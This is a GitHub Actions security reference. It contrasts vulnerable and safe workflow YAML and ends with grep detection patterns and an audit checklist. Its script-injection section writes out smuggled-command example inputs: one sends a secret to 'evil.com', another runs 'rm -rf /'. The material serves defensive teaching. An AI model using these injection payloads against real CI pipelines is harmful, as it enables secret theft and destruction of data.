# GitHub Actions Security Reference

## Overview

GitHub Actions workflows execute arbitrary code with access to secrets, infrastructure, and deployment targets. Misconfigurations can leak credentials, allow code injection, or grant attackers access to production environments.

---

## Secrets in Workflows

```yaml
# VULNERABLE: Hardcoded secrets in workflow file
env:
  DB_PASSWORD: "mysecretpassword"
  API_KEY: "sk-12345"

# VULNERABLE: Secrets echoed in logs
- run: |
    echo $SECRET_TOKEN  # Visible in job logs
    curl -H "Authorization: Bearer $API_KEY" https://api.example.com | tee output.log

# SAFE: Use repository/environment secrets (Settings > Secrets and variables > Actions)
- run: curl -H "Authorization: Bearer $API_KEY" https://api.example.com > /dev/null
  env:
    API_KEY: ${{ secrets.API_KEY }}
```

### Secret Configuration

| Setting                  | Purpose                                    | When to Use                     |
| ------------------------ | ------------------------------------------ | ------------------------------- |
| **Repository secrets**   | Available to all workflows                 | General tokens, API keys        |
| **Environment secrets**  | Scoped to specific deployment environments | Production secrets, deploy keys |
| **Organization secrets** | Shared across repos                        | Team-wide credentials           |

```yaml
# VULNERABLE: Secret value passed via expression (may appear in debug logs)
- run: echo "Token is ${{ secrets.API_KEY }}" # Secret interpolated into run script

# FLAG: Expressions that expand secrets directly into run commands
```

---

## Script Injection

Attacker-controlled GitHub context values used in `run:` steps can execute arbitrary commands when interpolated directly.

### Attacker-Controlled Context Values

| Value                                     | Source           | Risk           |
| ----------------------------------------- | ---------------- | -------------- |
| `${{ github.event.pull_request.title }}`  | PR title         | PR author      |
| `${{ github.event.pull_request.body }}`   | PR description   | PR author      |
| `${{ github.event.head_commit.message }}` | Commit message   | Commit author  |
| `${{ github.ref_name }}`                  | Branch/tag name  | Branch creator |
| `${{ github.event.issue.title }}`         | Issue title      | Issue author   |
| `${{ github.event.comment.body }}`        | Issue/PR comment | Commenter      |

```yaml
# VULNERABLE: Unescaped context value in run step
- run: echo "Building ${{ github.event.pull_request.title }}"
  # Attacker PR title: "; curl http://evil.com/steal?token=$SECRET"

# VULNERABLE: Context value in shell command
- run: git tag -a "${{ github.ref_name }}" -m "Release"
  # Attacker branch: "; rm -rf /"

# SAFE: Pass context values via environment variables
- run: echo "Building $PR_TITLE"
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  # Shell treats $PR_TITLE as data, not executable code
```

---

## Artifact Security

```yaml
# VULNERABLE: Sensitive data in uploaded artifacts
- uses: actions/upload-artifact@v4
  with:
    name: build-output
    path: |
      .env
      credentials.json
      coverage/  # May contain source code paths

# VULNERABLE: Artifacts on public repos accessible to anyone
# Default: artifacts are public on public repositories

# SAFE: Restrict artifact content and set retention
- uses: actions/upload-artifact@v4
  with:
    name: build-output
    path: build/
    retention-days: 7
```

---

## Runner Security

```yaml
# VULNERABLE: Using self-hosted runners for untrusted workflows (e.g., from forks)
# Self-hosted runners persist state between runs — attackers can poison runner environment

on:
  pull_request:    # Triggered by fork PRs — can run attacker code on self-hosted runner
jobs:
  build:
    runs-on: self-hosted  # DANGEROUS if PRs from forks trigger this

# SAFE: Use GitHub-hosted runners for workflows triggered by untrusted input
jobs:
  build:
    runs-on: ubuntu-latest  # Ephemeral, isolated

# SAFE: For self-hosted runners, restrict to trusted branches/actors
on:
  pull_request:
    branches: [main]
  push:
    branches: [main]
```

---

## Workflow Permissions

```yaml
# VULNERABLE: Default broad GITHUB_TOKEN permissions
# Without explicit permissions block, token may have write access to all scopes

# SAFE: Use minimal permissions
permissions:
  contents: read
  pull-requests: write # Only if needed

jobs:
  build:
    permissions:
      contents: read # Job-level override (most restrictive wins)
```

```yaml
# VULNERABLE: Passing GITHUB_TOKEN to untrusted actions
- uses: untrusted-org/action@main
  with:
    token: ${{ secrets.GITHUB_TOKEN }} # Grants write access to attacker's action

# SAFE: Scope token to minimum needed; avoid passing to third-party actions
```

---

## Third-Party Action Pinning

```yaml
# VULNERABLE: Using mutable tags — can change at any time
- uses: actions/checkout@v4
- uses: some-org/some-action@main # Branch tip — attacker can push malicious code

# VULNERABLE: Using latest tag
- uses: some-action@latest

# SAFE: Pin to specific commit SHA
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
- uses: some-org/some-action@abc123def456789... # Pinned to known-good commit

# ACCEPTABLE: Trusted, well-maintained actions with verified SHA in comment
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
```

---

## `pull_request_target` Risks

```yaml
# VULNERABLE: Checking out PR code in pull_request_target context
# pull_request_target runs with write permissions and access to secrets
on:
  pull_request_target:
jobs:
  build:
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.ref }} # Checks out attacker code
      - run: npm install && npm run build # Executes attacker-controlled code with secrets access


# SAFE: If you must use pull_request_target, never check out or execute PR code in the same job
# Split into two jobs: one to check out/build (no secrets), one to deploy (no PR code)
```

---

## Docker-in-Docker

```yaml
# VULNERABLE: Privileged container mode
jobs:
  build:
    runs-on: ubuntu-latest
    container:
      image: docker:latest
      options: --privileged  # Container can escape to host

# VULNERABLE: Mounting Docker socket
- run: docker run -v /var/run/docker.sock:/var/run/docker.sock myimage

# SAFE: Use Kaniko for unprivileged image builds
- uses: docker/build-push-action@v5
  with:
    context: .
    push: true
    tags: myimage:latest

# SAFE: Use GitHub's built-in Docker support (no privileged mode needed)
```

---

## Grep Patterns

```bash
# Hardcoded secrets in workflow files
grep -rn "password\|secret\|api_key\|token.*=" --include="*.yml" .github/workflows/

# Script injection (attacker-controlled context values interpolated into run steps)
grep -rn "github\.event\.pull_request\.title\|github\.event\.pull_request\.body\|github\.event\.head_commit\.message" --include="*.yml" .github/workflows/

# Echoing secrets
grep -rn "echo.*\$\|tee\|>.*log" --include="*.yml" .github/workflows/ | grep -i "token\|secret\|key\|pass"

# Unpinned third-party actions (using branch/tag ref)
grep -rn "uses:.*@main\|uses:.*@master\|uses:.*@latest\|uses:.*@v[0-9]" --include="*.yml" .github/workflows/

# Privileged Docker
grep -rn "privileged\|docker\.sock\|DOCKER_HOST" --include="*.yml" .github/workflows/

# pull_request_target with checkout
grep -B10 "pull_request_target" .github/workflows/*.yml | grep -A5 "checkout"

# Sensitive files in artifacts
grep -A5 "upload-artifact" .github/workflows/*.yml | grep "\.env\|credentials\|\.pem\|\.key"
```

---

## Testing Checklist

- [ ] No hardcoded secrets in `.github/workflows/*.yml`
- [ ] All sensitive values passed via `${{ secrets.* }}` with `env:` binding (not direct interpolation)
- [ ] No attacker-controlled context values (`pr.title`, `commit.message`) directly in `run:` steps
- [ ] No sensitive data in uploaded artifacts
- [ ] Third-party actions pinned to specific commit SHA (not branch/tag)
- [ ] `GITHUB_TOKEN` permissions explicitly minimized via `permissions:` block
- [ ] `pull_request_target` workflows never check out or execute PR code
- [ ] Self-hosted runners not used for workflows triggered by untrusted fork PRs
- [ ] Privileged container mode justified or replaced with safer alternative
- [ ] `GITHUB_TOKEN` not passed to untrusted third-party actions

---

## References

- [GitHub Actions Security Hardening](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)
- [OWASP CI/CD Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/CI_CD_Security_Cheat_Sheet.html)
- [GitHub Actions: Keeping your GitHub Actions and workflows secure](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/)
